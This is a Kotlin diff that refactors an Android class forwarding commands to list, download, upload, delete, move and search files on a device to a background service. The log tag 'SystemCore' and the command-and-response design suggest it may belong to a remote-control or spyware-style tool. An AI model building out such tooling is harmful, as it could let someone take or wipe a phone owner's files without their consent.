@@ -9,17 +9,21 @@ class FileHandlers(private val ctx: CommandContext) {
         private const val TAG = "SystemCore"
     }
 
-    fun executeBrowseFiles(params: JSONObject?) {
-        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
+    private fun delegateToFileBrowser(command: String, params: JSONObject) {
         val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
             putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "list_files")
-            putExtra("params", JSONObject().apply {
-                put("path", path)
-                put("recursive", params?.optBoolean("recursive", false) ?: false)
-            }.toString())
+            putExtra("command", command)
+            putExtra("params", params.toString())
         }
         ctx.appContext.startService(intent)
+    }
+
+    fun executeBrowseFiles(params: JSONObject?) {
+        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
+        delegateToFileBrowser("list_files", JSONObject().apply {
+            put("path", path)
+            put("recursive", params?.optBoolean("recursive", false) ?: false)
+        })
         ctx.sendResponse("file_browser", JSONObject().apply {
             put("status", "listing")
             put("path", path)
@@ -29,101 +33,56 @@ class FileHandlers(private val ctx: CommandContext) {
     fun executeListFiles(params: JSONObject?) {
         val path = params?.optString("path", "/sdcard") ?: "/sdcard"
         val recursive = params?.optBoolean("recursive", false) ?: false
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "list_files")
-            putExtra("params", JSONObject().apply {
-                put("path", path)
-                put("recursive", recursive)
-            }.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("list_files", JSONObject().apply {
+            put("path", path)
+            put("recursive", recursive)
+        })
     }
 
     fun executeDownloadFile(params: JSONObject?) {
         val path = params?.optString("path") ?: return
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "download_file")
-            putExtra("params", JSONObject().apply {
-                put("path", path)
-            }.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("download_file", JSONObject().apply {
+            put("path", path)
+        })
     }
 
     fun executeUploadFile(params: JSONObject?) {
         params ?: return
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "upload_file")
-            putExtra("params", params.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("upload_file", params)
     }
 
     fun executeUploadFileChunk(params: JSONObject?) {
         params ?: return
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "upload_file_chunk")
-            putExtra("params", params.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("upload_file_chunk", params)
     }
 
     fun executeDeleteFile(params: JSONObject?) {
         val path = params?.optString("path") ?: return
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "delete_file")
-            putExtra("params", JSONObject().apply {
-                put("path", path)
-            }.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("delete_file", JSONObject().apply {
+            put("path", path)
+        })
     }
 
     fun executePreviewFile(params: JSONObject?) {
         val path = params?.optString("path") ?: return
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "preview_file")
-            putExtra("params", JSONObject().apply {
-                put("path", path)
-                put("max_size", params?.optLong("max_size", 1024 * 1024) ?: (1024 * 1024))
-            }.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("preview_file", JSONObject().apply {
+            put("path", path)
+            put("max_size", params?.optLong("max_size", 1024 * 1024) ?: (1024 * 1024))
+        })
     }
 
     fun executeRenameFile(params: JSONObject?) {
         params ?: return
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "rename_file")
-            putExtra("params", params.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("rename_file", params)
     }
 
     fun executeMoveFile(params: JSONObject?) {
         params ?: return
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "move_file")
-            putExtra("params", params.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("move_file", params)
     }
 
     fun executeSearchFiles(params: JSONObject?) {
         params ?: return
-        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
-            putExtra("request_id", ctx.getCurrentRequestId())
-            putExtra("command", "search_files")
-            putExtra("params", params.toString())
-        }
-        ctx.appContext.startService(intent)
+        delegateToFileBrowser("search_files", params)
     }
 }
